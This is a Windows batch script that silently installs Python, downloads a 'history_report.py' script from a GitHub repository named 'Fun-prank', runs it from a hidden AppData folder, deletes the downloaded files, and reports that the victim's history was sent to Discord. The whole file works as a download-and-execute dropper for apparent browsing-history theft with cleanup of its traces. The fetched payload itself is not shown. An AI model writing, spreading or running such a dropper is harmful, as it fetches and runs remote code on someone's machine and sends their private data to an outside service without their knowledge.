@echo off
:: Step 1: Check if Python is installed
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo Python is not installed. Installing Python silently...
    powershell -Command "Start-Process 'https://www.python.org/ftp/python/3.9.9/python-3.9.9-amd64.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -NoNewWindow -Wait"
)

:: Step 2: Install pip if not installed
where pip >nul 2>nul
if %errorlevel% neq 0 (
    echo pip is not installed. Installing pip silently...
    python -m ensurepip --upgrade
)

:: Step 3: Install necessary Python libraries (requests)
echo Installing required libraries (requests)...
pip install --upgrade requests

:: Step 4: Create a folder for the script if it doesn't exist
mkdir "%APPDATA%\history"

:: Step 5: Download the Python script from GitHub to the history folder
echo Downloading Python script...
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/history_report.py -OutFile '%APPDATA%\history\history_report.py'"

:: Step 6: Download the requirements.txt file (if needed) to the history folder
echo Downloading requirements.txt...
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/requirements.txt -OutFile '%APPDATA%\history\requirements.txt'"

:: Step 7: Install the required libraries from requirements.txt
echo Installing required libraries from requirements.txt...
pip install -r "%APPDATA%\history\requirements.txt"

:: Step 8: Run the Python script directly
echo Running the Python script...
python "%APPDATA%\history\history_report.py"

:: Step 9: Clean up the downloaded files (keeping the folder for logs)
del "%APPDATA%\history\history_report.py"
del "%APPDATA%\history\requirements.txt"

:: Step 10: Inform the user
echo History successfully sent to Discord.
pause
